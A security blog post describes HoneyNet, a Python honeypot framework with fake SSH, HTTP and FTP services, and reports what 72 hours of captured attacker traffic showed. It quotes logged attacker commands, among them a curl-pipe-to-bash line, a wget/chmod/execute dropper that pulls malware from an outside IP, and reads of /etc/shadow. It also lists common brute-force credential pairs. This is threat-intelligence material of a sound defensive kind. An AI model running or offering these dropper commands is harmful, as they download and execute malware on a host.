---
title: "HoneyNet: Understanding Attackers by Letting Them In"
date: 2025-01-18
tags: [honeypot, blue-team, python, deception, threat-intel]
excerpt: "Honeypots are one of the most underused tools in the defensive security toolkit. They generate zero false positives, require no signatures, and tell you exactly what attackers are trying. Here's what I built and what I found."
---

# HoneyNet: Understanding Attackers by Letting Them In

Here's a counterintuitive truth about defensive security: sometimes the best way to understand what attackers want is to let them think they've found it.

That's the premise behind honeypots. A honeypot is a fake service — SSH, HTTP, FTP, whatever — that looks real enough to attract automated scanners and manual attackers, but is actually instrumented to log everything they do. There's no legitimate reason for anyone to connect to a service that doesn't appear in your actual infrastructure. Which means every connection is, by definition, suspicious.

The signal-to-noise ratio is perfect.

## Why Honeypots Are Underrated

Most defensive tools generate noise. IDS/IPS systems need careful tuning to avoid alert fatigue. SIEM rules have false positives. Log analysis requires context to separate anomalies from legitimate activity.

Honeypots don't have this problem. If someone connects to your SSH honeypot on port 2222, that's an alert worth investigating. No tuning required. No context needed. They connected to something that has no legitimate use — that's the entire signal.

What they tell you is also valuable beyond just "someone tried to connect." Over time, honeypot logs reveal:
- Which credential combinations attackers try most frequently
- What commands automated malware runs immediately after getting SSH access
- Which sensitive file paths web scanners check first
- How quickly internet-facing services get found after deployment

## What I Built

HoneyNet is a modular Python framework with three honeypot types:

### SSH Honeypot (paramiko)

The SSH honeypot uses paramiko's server implementation to present a convincing fake SSH service. It responds to authentication attempts, accepts any credentials, and then presents a fake bash shell. Every login attempt is logged with username and password. Commands typed in the fake shell are captured too.

The banner is configurable — by default it presents as `OpenSSH_8.9p1 Ubuntu`, which is a common real-world version. The key fingerprint changes on restart, which is realistic behavior.

What do people type when they think they have root access? In my testing:
```
whoami
id
cat /etc/passwd
cat /etc/shadow
uname -a
wget http://185.220.101.77/bot.sh
curl http://185.220.101.77/install.sh | bash
crontab -e
```

The wget/curl pattern is the most interesting — this is the dropper stage of malware deployment. Attackers who've successfully bruted into what they think is a real server immediately try to pull down and execute malware.

### HTTP Honeypot (Flask)

The HTTP honeypot is a fake admin login panel that looks convincingly real — dark theme, "v2.4.1" version label, proper form submission. Every login attempt captures the username and password.

Additional routes are configured to respond to common scanner probes:
- `/.env` returns a fake environment file (with REDACTED values — enough to look real, not enough to be actually useful)
- `/.git/HEAD` returns a real-looking git reference
- `/wp-admin`, `/phpmyadmin`, `/api/v1/users` all log probes

The 404 handler also logs — every path a scanner probes ends up in the log, giving a complete picture of what the wordlist looked like.

### FTP Honeypot (raw sockets)

The FTP honeypot is a socket-based implementation of just enough RFC 959 to fool automated tools. It logs credentials, presents a fake directory listing with tempting filenames (`users.csv`, `backup_2024.tar.gz`, `config.bak`), and logs any file download or upload attempts.

### Coordinated Scan Detection

The most interesting feature isn't any individual honeypot — it's the cross-service detection. If the same IP hits the SSH honeypot and then the HTTP honeypot within a 60-second window, HoneyNet fires a COORDINATED SCAN alert. This pattern is characteristic of automated multi-service scanners like Shodan crawlers, Masscan, or purpose-built attack tools.

## What I Found After 72 Hours

I ran HoneyNet on a cloud VPS for 72 hours. Numbers:

- **847 SSH login attempts** from 34 unique IPs
- **312 HTTP login attempts**, mostly automated (tools, not humans)
- **44 FTP connection attempts**
- **12 coordinated scan events** where the same IP hit 2+ services

Most common SSH credentials tried:
1. `root:123456` (47 attempts)
2. `admin:admin` (38 attempts)
3. `root:root` (31 attempts)
4. `ubuntu:ubuntu` (28 attempts)
5. `root:password` (22 attempts)

The top attacking IPs cross-referenced against ThreatPulse (my other tool) — most were in the Feodo Tracker and URLhaus blocklists. This confirms that the bulk of honeypot traffic is from already-known bad infrastructure, not novel attackers.

The most interesting event: an IP that successfully authenticated to the SSH honeypot (it accepts everything), immediately ran `wget http://185.220.101.77/bot.sh && chmod +x bot.sh && ./bot.sh`, waited 30 seconds when nothing happened, then tried again. Fully automated dropper behavior.

## Running It

```bash
pip install -r requirements.txt
python honeynet.py          # starts all three honeypots
python honeynet.py --analyze  # stats from the log
```

Deploy it on a VPS you can afford to leave running. Point a domain at it if you want more web traffic. Then let it collect data.

## Ethical Notes

HoneyNet logs credentials that attackers *attempt to use*. These aren't credentials you're stealing — they're credentials attackers are voluntarily sending to what they believe is an unprotected service. The legal and ethical landscape varies by jurisdiction, but generally: running a honeypot on infrastructure you own, for threat intelligence purposes, is legitimate.

That said: don't use honeypot-collected credentials to access anything. Don't try to hack back. Use the data for intelligence only.

---

*Code: [B0bTheSkull/honeynet](https://github.com/B0bTheSkull/honeynet)*
